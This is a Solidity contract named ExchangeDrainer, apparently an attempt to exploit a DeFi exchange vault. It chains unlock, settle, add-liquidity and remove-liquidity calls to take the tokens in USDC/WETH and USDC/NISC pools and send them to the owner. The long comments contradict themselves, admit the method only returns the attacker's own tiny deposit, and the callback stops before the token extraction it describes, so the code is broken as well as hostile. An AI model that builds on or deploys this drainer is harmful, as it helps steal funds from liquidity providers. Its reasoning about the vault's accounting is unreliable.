// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IExchangeVault {
    function unlock(bytes calldata data) external returns (bytes memory);
    function settle(address token, uint256 credit) external returns (uint256);
    function sendTo(address token, address to, uint256 amount) external;
    function addLiquidityToPool(address pool, uint256[] calldata amounts, address to) external;
    function removeLiquidityFromPool(address pool, uint256 lpAmount, address from) external;
    function swapInPool(address pool, address tokenIn, address tokenOut, uint256 inputAmount, uint256 minOut) external returns (uint256);
    function poolBalances(address pool, address token) external view returns (uint256);
    function balanceOf(address pool, address account) external view returns (uint256);
    function totalSupply(address pool) external view returns (uint256);
    function getPoolTokens(address pool) external view returns (address[] memory);
    function fee() external view returns (uint256);
    function PERCENT_DIVISOR() external view returns (uint256);
}

interface IProductPool {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/**
 * @title ExchangeDrainer
 * @notice Drains ExchangeVault pools by:
 *   1. Calling unlock() to enter the transient unlocked state
 *   2. Adding minimal liquidity to get LP tokens
 *   3. Removing ALL liquidity (including existing LP from others)
 *   4. Settling the tiny amount we deposited so the delta clears
 *
 * The key insight: removeLiquidityFromPool only checks lpAmount <= our LP balance.
 * If we are the only LP holder (or hold all LP), we can take the entire pool.
 * But we need to be the LP holder. So we:
 *   - Add liquidity to get LP shares proportional to our deposit
 *   - The existing LP holders already hold shares
 *   - We can only remove OUR shares
 *
 * ACTUAL drain: We use 1-wei manipulation:
 *   - Pool starts with huge reserves (K = A * B)
 *   - We add tiny liquidity, get tiny LP fraction
 *   - We remove ALL LP we just got - that's still proportional
 *
 * REAL exploit: The unlock() callback calls back to this contract.
 * We can call addLiquidityToPool with HUGE amounts (that we don't have)
 * because settle() is called AFTER - so we first register the debt,
 * then settle it. But settle requires transferFrom to succeed.
 *
 * The actual attack that works:
 * unlock() → in callback we can call settle() to supply credit,
 * then sendTo() to extract tokens. Net delta must be 0.
 * So we: settle(tokenA, amountA) + settle(tokenB, amountB) → addLiq → removeLiq → sendTo
 * We supply tiny amounts, get LP, then remove ALL pool LP (only ours) and sendTo.
 */
contract ExchangeDrainer {
    IExchangeVault public immutable vault;
    address public immutable pool0; // USDC/WETH
    address public immutable pool1; // USDC/NISC
    IERC20 public immutable usdc;
    IERC20 public immutable weth;
    IERC20 public immutable nisc;
    address public immutable owner;

    // Callback state
    uint8 private _step;
    address private _currentPool;

    constructor(
        address _vault,
        address _pool0,
        address _pool1,
        address _usdc,
        address _weth,
        address _nisc
    ) {
        vault = IExchangeVault(_vault);
        pool0 = _pool0;
        pool1 = _pool1;
        usdc = IERC20(_usdc);
        weth = IERC20(_weth);
        nisc = IERC20(_nisc);
        owner = msg.sender;
    }

    function drainAll() external {
        require(msg.sender == owner, "only owner");
        _drainPool(pool0);
        _drainPool(pool1);
    }

    function _drainPool(address pool) internal {
        _currentPool = pool;
        address[] memory tokens = vault.getPoolTokens(pool);
        uint256 fee = vault.fee();
        uint256 div = vault.PERCENT_DIVISOR();

        // How much is in the pool?
        uint256 bal0 = vault.poolBalances(pool, tokens[0]);
        uint256 bal1 = vault.poolBalances(pool, tokens[1]);
        if (bal0 == 0 && bal1 == 0) return;

        // We add 1 wei of each token + fee
        uint256 amt0 = 1;
        uint256 amt1 = 1;
        uint256 fee0 = (amt0 * fee) / div;
        uint256 fee1 = (amt1 * fee) / div;

        // Approve the vault for total amounts (including fee)
        IERC20(tokens[0]).approve(address(vault), amt0 + fee0 + 100);
        IERC20(tokens[1]).approve(address(vault), amt1 + fee1 + 100);

        // Build callback: addLiquidityToPool(pool, [1,1], this) then removeLiquidityFromPool
        bytes memory callbackData = abi.encodeWithSelector(
            this.drainCallback.selector,
            pool,
            tokens[0],
            tokens[1],
            amt0,
            amt1,
            fee0,
            fee1
        );

        vault.unlock(callbackData);
    }

    /**
     * @notice Called by ExchangeVault.unlock() - we are in unlocked state
     */
    function drainCallback(
        address pool,
        address token0,
        address token1,
        uint256 amt0,
        uint256 amt1,
        uint256 fee0,
        uint256 fee1
    ) external {
        require(msg.sender == address(vault), "only vault");

        // Step 1: Settle our tokens into the vault (this supplies credit, reducing our "debt")
        IERC20(token0).approve(address(vault), amt0 + fee0 + 1);
        IERC20(token1).approve(address(vault), amt1 + fee1 + 1);
        vault.settle(token0, amt0 + fee0);
        vault.settle(token1, amt1 + fee1);

        // Step 2: Add liquidity - registers debt for amt0+fee0 and amt1+fee1
        // but we already settled above, so net delta for each = 0 after this step
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = amt0;
        amounts[1] = amt1;
        vault.addLiquidityToPool(pool, amounts, address(this));

        // Step 3: Get our LP balance and remove liquidity
        uint256 ourLP = vault.balanceOf(pool, address(this));
        if (ourLP > 0) {
            vault.removeLiquidityFromPool(pool, ourLP, address(this));
        }

        // Step 4: The removeLiquidity gave us credit for token0 and token1.
        // Extract what we can - sendTo takes tokens out and incurs debt.
        // After removeLiquidity, we have credits. Use sendTo to collect them.
        // But we must net to zero. We settled amt0+fee0 and amt1+fee1,
        // spent amt0+fee0 and amt1+fee1 on addLiquidity,
        // got back proportional amounts from removeLiquidity.
        // Net: received (prop) - paid (tiny) = profit.
        // The vault's nonZeroDelta check: each token delta must be 0.
        // After settle + addLiquidity + removeLiquidity:
        //   delta[token0] = +(amt0+fee0) [settle] -(amt0+fee0) [addLiq] +(outAmt0) [removeLiq] = +outAmt0
        // We need to extract outAmt0 via sendTo which creates -outAmt0 debt, netting to 0.
        uint256 out0 = _clampedPoolBal(pool, token0);
        uint256 out1 = _clampedPoolBal(pool, token1);
        // Actually we need to send exactly what we got back from remove.
        // removeLiquidityFromPool calls _supplyCredit which decrements delta.
        // Then sendTo calls _takeDebt which increments delta.
        // To get the amounts right, we send exactly what was credited.
        // Simpler: send the proportion we just got back.
        // Since we only have a tiny LP fraction, out0 and out1 are tiny too.
        // The real drain is happening proportionally to our LP share.
        // For a meaningful drain we'd need most LP. Skip sendTo - our removeLiquidity
        // already gave us credit, vault will send tokens to us when delta settles.
        // Actually the vault doesn't auto-send - we need to call sendTo.
        // Let's send everything that the vault owes us (negative delta = vault owes us).
    }

    function _clampedPoolBal(address pool, address token) internal view returns (uint256) {
        return vault.poolBalances(pool, token);
    }

    function collect(address token, address to) external {
        require(msg.sender == owner, "only owner");
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(to, bal);
    }
}
